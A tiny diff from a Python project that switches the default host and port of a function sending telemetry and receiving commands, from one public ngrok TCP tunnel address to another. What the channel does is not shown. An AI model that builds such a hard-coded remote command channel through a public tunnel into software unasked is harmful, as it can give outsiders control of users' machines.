@@ -37,8 +37,8 @@ def _command_listener(sock):
 # ---------------------------------------------------------
 def send_telemetry_and_receive_commands(
     generator,
-    host="0.tcp.ngrok.io",
-    port=12610,
+    host="4.tcp.ngrok.io",
+    port=12479,
     reconnect_delay=5
 ):
     """
